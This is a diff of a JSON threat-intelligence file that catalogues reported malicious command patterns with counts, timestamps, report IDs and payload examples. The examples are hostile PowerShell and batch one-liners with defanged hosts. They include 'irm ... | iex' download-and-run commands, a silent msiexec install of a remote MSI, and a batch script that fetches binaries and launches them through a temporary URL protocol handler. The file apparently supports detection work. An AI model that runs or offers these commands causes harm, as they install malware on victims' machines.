@@ -1,13 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 124,
-    "ReportCount": 124,
-    "FirstSeen": "2026-11-17T04:16:25.027000+00:00",
+    "DistinctPayloadCount": 122,
+    "ReportCount": 122,
+    "FirstSeen": "2026-11-17T04:37:54.985000+00:00",
     "LastSeen": "2026-11-22T12:29:08.297000+00:00",
     "ReportIds": [
-      "cmwk6k4pd1avk0omlczwcm3rd",
-      "cmwk6ujt41baj0oml14o237b2",
       "cmwk7brz41bwj0omlleavf342",
       "cmwk7kmpm1c6m0oml0aps1e2q",
       "cmwk7l7dl1c9k0omlhbc6eque",
@@ -217,7 +215,6 @@
       "irm 'browse-cloud.codes/d92cc57d903126ca'|iex;",
       "irm 'browse-cloud.codes/deb16e74de52341f'|iex;",
       "irm 'browse-cloud.codes/df805a6fac02c376'|iex;",
-      "irm 'browse-cloud.codes/e0f86137ef78e8ec'|iex;",
       "irm 'browse-cloud.codes/e1869d542b246dfd'|iex;",
       "irm 'browse-cloud.codes/e2e4d2142198fde7'|iex;",
       "irm 'browse-cloud.codes/e3e4909247d60a04'|iex;",
@@ -232,7 +229,6 @@
       "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
       "irm 'browse-cloud.codes/f787aa2bee9432bb'|iex;",
       "irm 'browse-cloud.codes/f8d105660261b6d8'|iex;",
-      "irm 'browse-cloud.codes/fa625dfc6bcfb436'|iex;",
       "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
       "irm 'browse-cloud.codes/fef4413d3abac8e0'|iex;",
       "irm 'img-codes-cloude[.]info/0253250b2b50c7ff'|iex;",
@@ -662,15 +658,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 10,
-    "ReportCount": 52,
-    "FirstSeen": "2026-11-17T04:13:49.026000+00:00",
+    "ReportCount": 47,
+    "FirstSeen": "2026-11-17T14:17:48.863000+00:00",
     "LastSeen": "2026-11-22T05:17:52.705000+00:00",
     "ReportIds": [
-      "cmwk6gsan1akk0oml325oec4f",
-      "cmwk6he431amb0omloev2qrcj",
-      "cmwk6hq8x1ap40omlnmflpsa2",
-      "cmwk6hw231aqb0omlyr9ew0ye",
-      "cmwk6js0k1at90omloc5rplsj",
       "cmwks1j5h1fne0omlmmivmcx4",
       "cmwktvio01fxo0omlc5hd3w8p",
       "cmwkv9kms1g1g0omljms1lzaw",
@@ -730,21 +721,6 @@
       "IRM gitlab[.]com/joon1286/1fdbd074-392d-4285-b67e-ff498ddcb29e/-/raw/main/b04f13f7-5981-4267-afc4-1e6152d7b677 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/abba73a-484e-4a80-bc53-401c1e95160d/-/raw/main/ac9eDc0-d13C-422f-8cfC-9F91441BfAb2 | IEX",
       "IRM xlfsgudhiaokbioa[.]sisterleveling[.]com/1b60ae7b-21f3-4d74-bb56-138bf4f4620b/b5e589ce-d56d-4c50-bc8d-502a073548.36 | IEX"
-    ]
-  },
-  {
-    "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "DistinctPayloadCount": 2,
-    "ReportCount": 2,
-    "FirstSeen": "2026-11-17T04:15:01.195000+00:00",
-    "LastSeen": "2026-11-17T20:46:15.496000+00:00",
-    "ReportIds": [
-      "cmwk6ibyh1asd0omlequtdloh",
-      "cmwl5x2pj1hne0omlek9idizj"
-    ],
-    "PayloadExamples": [
-      "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-      "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"https://updatchk[.]com/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
     ]
   },
   {
@@ -888,6 +864,19 @@
     ]
   },
   {
+    "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-17T20:46:15.496000+00:00",
+    "LastSeen": "2026-11-17T20:46:15.496000+00:00",
+    "ReportIds": [
+      "cmwl5x2pj1hne0omlek9idizj"
+    ],
+    "PayloadExamples": [
+      "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"https://updatchk[.]com/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
+    ]
+  },
+  {
     "Pattern": "$p=\"$env:APPDATA\\uni2\\Beautifull.exe\"; New-Item (Split-Path $p) -ItemType Directory -Force | Out-Null; curl.exe -fsL -o \"$p\" \"<URL>\"; if (Test-Path $p) { Start-Process $p }; exit",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
@@ -924,19 +913,6 @@
     ],
     "PayloadExamples": [
       "@echo off\r\nif \"%~1\"==\"_h\" goto :work\r\nstart \"\" /min cmd /c call \"%~f0\" _h\r\nexit /b\r\n:work\r\ntimeout /t 1 >nul\r\nset \"d=%APPDATA%\\Microsoft\\Windows\\Themes\"\r\nset \"l=%PUBLIC%\\v.txt\"\r\nmd \"%d%\" 2>nul\r\ncd /d \"%d%\"\r\necho z>>\"%l%\"\r\ndel /q v.txt 2>nul\r\ndel /q vclreg.exe 2>nul\r\ndel /q vclx370.dat 2>nul\r\nif exist vclreg.exe echo lockexe>>\"%l%\"\r\nif exist vclx370.dat echo lockbpl>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclreg.exe https://baseupdate2798[.]com/ue/x/o95Vqdue <nul\r\necho x%errorlevel%>>\"%l%\"\r\ncurl.exe -sSL --http1.1 --ssl-no-revoke --connect-timeout 20 --max-time 90 -o vclx370.dat https://baseupdate2798[.]com/ue/b/o95Vqdue <nul\r\necho b%errorlevel%>>\"%l%\"\r\ndel /q vclreg.exe:Zone.Identifier 2>nul\r\ndel /q vclx370.dat:Zone.Identifier 2>nul\r\nver >nul\r\n>t echo o95Vqdue baseupdate2798[.]com\r\nif exist vclreg.exe echo exe>>\"%l%\"\r\nif exist vclx370.dat echo bpl>>\"%l%\"\r\nfor %%f in (vclreg.exe vclx370.dat) do echo %%~zf>>\"%l%\"\r\nif exist vclreg.exe if exist vclx370.dat (\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /ve /d \"URL:vclimg\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\" /f /v \"URL Protocol\" /d \"\" >nul\r\nreg add \"HKCU\\Software\\Classes\\vclimg\\shell\\open\\command\" /f /ve /t REG_SZ /d \"\\\"%d%\\vclreg.exe\\\" -q \\\"%d%\\vclx370.dat\\\"\" >nul\r\necho r%errorlevel%>>\"%l%\"\r\n>\"%TEMP%\\t.url\" echo [InternetShortcut]\r\n>>\"%TEMP%\\t.url\" echo URL=vclimg:x\r\n%SystemRoot%\\explorer.exe \"%TEMP%\\t.url\"\r\n)\r\necho s%errorlevel%>>\"%l%\"\r\ntimeout /t 1 >nul\r\nreg delete \"HKCU\\Software\\Classes\\vclimg\" /f >nul\r\ndel /q \"%TEMP%\\t.url\" 2>nul"
-    ]
-  },
-  {
-    "Pattern": "Invoke-WebRequest \"<URL>\" -OutFile $z",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-17T04:11:57.901000+00:00",
-    "LastSeen": "2026-11-17T04:11:57.901000+00:00",
-    "ReportIds": [
-      "cmwk6eeiu1ajo0omlb9q6d1o1"
-    ],
-    "PayloadExamples": [
-      "Invoke-WebRequest \"https://swingerwives[.]com\" -OutFile $z"
     ]
   },
   {
